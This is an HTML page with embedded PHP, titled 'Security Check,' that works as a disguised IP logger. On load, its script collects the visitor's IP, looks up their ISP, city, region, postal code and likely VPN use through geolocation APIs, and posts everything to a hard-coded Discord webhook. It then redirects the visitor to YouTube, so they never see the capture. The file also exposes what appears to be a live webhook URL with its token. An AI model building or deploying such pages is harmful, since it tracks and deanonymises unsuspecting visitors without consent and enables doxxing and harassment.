<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check.</title>
    <script>
        function sendWebhookAndRedirect() {
            const webhookUrl = "https://discord.com/api/webhooks/1306930385837494284/frvIuZbW2lh_t01AuGTbwXBmk1saYYg5aZqUurx3U7uLYZpbMAZlxt3wWMoHvZM4b4rS";
            const ip = "<?php echo isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']; ?>";
            const browser = navigator.userAgent;

            // Avoid bots, crawlers or invalid users
            if (/bot|Discord|robot|curl|spider|crawler|^$/i.test(browser)) {
                return;
            }

            const date = new Date();
            const userDate = date.toLocaleDateString();
            const userTime = date.toLocaleTimeString();

            // Make the API calls
            fetch(`http://ip-api.com/json/${ip}`)
                .then(response => response.json())
                .then(details => {
                    return fetch(`https://json.geoiplookup.io/${ip}`)
                        .then(response => response.json())
                        .then(vpnCon => {
                            const vpn = vpnCon.connection_type === "Corporate" ? 
                                `Yes (Double Check: ${details.isp})` : 
                                `No (Double Check: ${details.isp})`;

                            const flag = `https://www.countryflags.io/${details.countryCode}/shiny/64.png`;
                            const data = {
                                content: `**User IP:** ${ip}\n**ISP:** ${details.isp}\n**Date:** ${userDate}\n**Time:** ${userTime}\n**Location:** ${details.city}\n**Region:** ${details.region}\n**Country:** ${details.country}\n**Postal Code:** ${details.zip}\n**IsVPN?** ${vpn} (Possible False-Positives)`,
                                username: `Visitor Visited From: ${details.country}`,
                                avatar_url: flag
                            };

                            const jsonData = JSON.stringify(data);

                            // Send the webhook request
                            fetch(webhookUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: jsonData
                            }).then(() => {
                                // Redirect to YouTube after webhook completion
                                window.location.href = "https://www.youtube.com";
                            });
                        });
                });
        }
        
        // Call the function when the page loads
        window.onload = sendWebhookAndRedirect;
    </script>
</head>
<body>
    <h1>Redirecting.</h1>
    <p>Overloaded</p>
</body>
</html>
